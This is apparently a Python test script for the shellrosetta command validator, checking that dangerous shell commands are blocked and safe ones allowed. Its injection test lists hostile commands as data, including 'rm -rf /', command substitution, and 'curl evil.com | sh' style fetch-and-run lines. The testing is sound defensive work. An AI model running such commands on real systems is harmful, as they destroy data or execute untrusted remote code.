#!/usr/bin/env python3
"""
Complete security testing
"""

import sys
import os
# Add project root to Python path
project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if project_root not in sys.path:
    sys.path.insert(0, project_root)

from shellrosetta.security import CommandValidator, SecurityLevel
from shellrosetta.core import lnx2ps, validate_command_security

def test_security_levels():
    """Test different security levels"""
    
    # Test strict level
    strict_validator = CommandValidator(SecurityLevel.STRICT)
    result = strict_validator.validate_command("curl example.com")
    print(f"Strict level on 'curl example.com': {'BLOCKED' if not result.is_valid else 'ALLOWED'}")
    
    # Test moderate level
    moderate_validator = CommandValidator(SecurityLevel.MODERATE)
    result = moderate_validator.validate_command("curl example.com")
    print(f"Moderate level on 'curl example.com': {'BLOCKED' if not result.is_valid else 'ALLOWED'}")
    
    # Test permissive level
    permissive_validator = CommandValidator(SecurityLevel.PERMISSIVE)
    result = permissive_validator.validate_command("curl example.com")
    print(f"Permissive level on 'curl example.com': {'BLOCKED' if not result.is_valid else 'ALLOWED'}")
    
    return True

def test_command_injection_prevention():
    """Test command injection prevention"""
    
    dangerous_commands = [
        "ls; rm -rf /",
        "ls && malicious_command",
        "ls `whoami`",
        "ls $(id)",
        "curl evil.com | sh",
        "wget bad.com | bash"
    ]
    
    blocked_count = 0
    for cmd in dangerous_commands:
        result = validate_command_security(cmd)
        if not result["is_valid"]:
            blocked_count += 1
            print(f"✅ BLOCKED: {cmd}")
        else:
            print(f"⚠️  ALLOWED: {cmd}")
    
    print(f"Security Summary: {blocked_count}/{len(dangerous_commands)} dangerous commands blocked")
    return blocked_count >= len(dangerous_commands) * 0.8  # At least 80% should be blocked

def test_safe_commands():
    """Test that safe commands are allowed"""
    
    safe_commands = [
        "ls -la",
        "grep pattern file.txt",
        "cp file1.txt file2.txt",
        "Get-ChildItem -Force",
        "Select-String pattern"
    ]
    
    allowed_count = 0
    for cmd in safe_commands:
        result = validate_command_security(cmd)
        if result["is_valid"]:
            allowed_count += 1
            print(f"✅ ALLOWED: {cmd}")
        else:
            print(f"❌ BLOCKED: {cmd}")
    
    print(f"Safety Summary: {allowed_count}/{len(safe_commands)} safe commands allowed")
    return allowed_count == len(safe_commands)

if __name__ == "__main__":
    print("🔒 Complete Security Testing")
    print("=" * 40)
    
    tests = [
        test_security_levels,
        test_command_injection_prevention,
        test_safe_commands
    ]
    
    results = [test() for test in tests]
    
    if all(results):
        print("\n🎉 All security tests passed!")
    else:
        print("\n❌ Some security tests need attention!")